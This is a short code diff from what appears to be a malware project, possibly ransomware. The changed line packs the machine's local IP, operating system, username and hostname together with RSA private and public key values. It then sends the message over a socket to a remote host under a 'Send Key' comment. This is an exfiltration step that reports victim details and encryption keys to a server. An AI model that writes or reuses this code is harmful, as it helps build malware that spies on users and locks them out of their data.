@@ -159,7 +159,7 @@ def main():
                 # Send Key
                 server.connect((host, port))
                 msg = '%s$%s$%s$%s$%s$%s' % (
-                    getlocalip(), platform.system(), private_key, public_key, getpass.getuser(), platform.node())
+                    getlocalip(), platform.system(), SERVER_PRIVATE_RSA_KEY, SERVER_PUBLIC_RSA_KEY, getpass.getuser(), platform.node())
                 server.send(msg.encode('utf-8'))
 
                 # if plt == "Windows"
